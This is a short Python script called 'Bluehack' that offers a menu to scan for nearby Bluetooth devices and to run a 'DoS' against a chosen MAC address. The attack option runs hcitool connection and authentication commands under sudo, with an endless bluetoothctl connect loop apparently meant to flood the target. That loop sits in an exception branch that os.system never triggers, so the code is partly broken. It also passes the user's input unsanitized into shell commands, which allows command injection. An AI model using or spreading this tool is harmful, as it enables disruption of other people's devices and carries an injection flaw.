import time
import sys
import os

def banner():
    os.system("clear")
    print(""" --  |   |    |  -- |   |        ---- | /  """)
    print("""|  | |   |    | |   |   |       |     |/   """)
    print("""| -  |   |    | |-- |---|   /\  |     |\   """)
    print("""|  | |   |    | |   |   |  /--\ |     | \  """)
    print(""" --  |__  ----   -- |   | /    \ ---- |  \ """)
def opt(): # options code
   print("Scan        [ 1 ]")
   print("Dos         [ 2 ]")
   print("exit        [ 3 ]")
   opt = input("[ Bluehack ] --> ")
   if opt == "1":
       listen()
   elif opt == "2":
       send()
   else:
       sys.exit()
def listen(): # listen code
    os.system("hcitool scan")
def send(): # Dos code
    mac = input("remote mac --> ")
    try:
        os.system("sudo hcitool cc {} ; sudo hcitool auth {}".format(mac, mac))
    except Exception:
        try:
            while True:
                os.system("bluetoothctl connect {}".format(mac))
        except Exception:
            sys.exit()
time.sleep(0.5)
banner()
while True:
    opt()
